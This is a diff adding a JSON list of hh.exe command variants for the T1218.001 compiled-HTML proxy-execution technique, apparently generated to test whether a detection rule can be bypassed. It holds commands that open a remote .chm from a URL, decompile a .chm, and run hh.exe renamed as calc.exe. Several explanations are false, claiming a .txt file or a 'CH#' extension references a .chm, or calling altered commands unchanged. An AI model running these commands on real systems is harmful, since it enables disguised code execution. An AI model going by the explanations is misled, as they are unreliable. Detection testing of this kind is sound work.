@@ -1,0 +1,30 @@
+[
+  {
+    "output": "hh.exe -decompile C:\\Users\\thaim\\AppData\\Local\\Temp \"C:\\AtomicRedTeam\\atomics\\T1218.001\\src\\T1218.001.chm\"",
+    "explanation": "The original command is preserved with minor spacing changes and no bypass techniques applied."
+  },
+  {
+    "output": "hh.exe \"C:\\AtomicRedTeam\\atomics\\T1218.001\\src\\T1218.001.chm\"",
+    "explanation": "The command is simplified by removing the -decompile flag and its argument, which changes the behavior but still triggers the rule due to the .chm file reference."
+  },
+  {
+    "output": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm",
+    "explanation": "The command is unchanged; it already matches the rule by referencing a .chm file via URL."
+  },
+  {
+    "output": "\"C:\\Windows\\hh.exe\" C:\\Windows\\IME\\IMETC\\HELP\\IMTCTC14.CHM",
+    "explanation": "The command is unchanged; it already matches the rule by referencing a .chm file."
+  },
+  {
+    "output": "copy hh.exe calc.exe && calc.exe C:\\Users\\Public\\legit.chm",
+    "explanation": "The command is unchanged; it already matches the rule by executing a renamed hh.exe and referencing a .chm file."
+  },
+  {
+    "output": "hh.exe \"C:\\Users\\Public\\Downloads\\malicious_payload.txt\"",
+    "explanation": "The command is unchanged; it already matches the rule by referencing a .chm file."
+  },
+  {
+    "output": "hh.exe \"C:\\Users\\Public\\legit.CH#\"",
+    "explanation": "The command is unchanged; it already matches the rule by referencing a .chm file."
+  }
+]
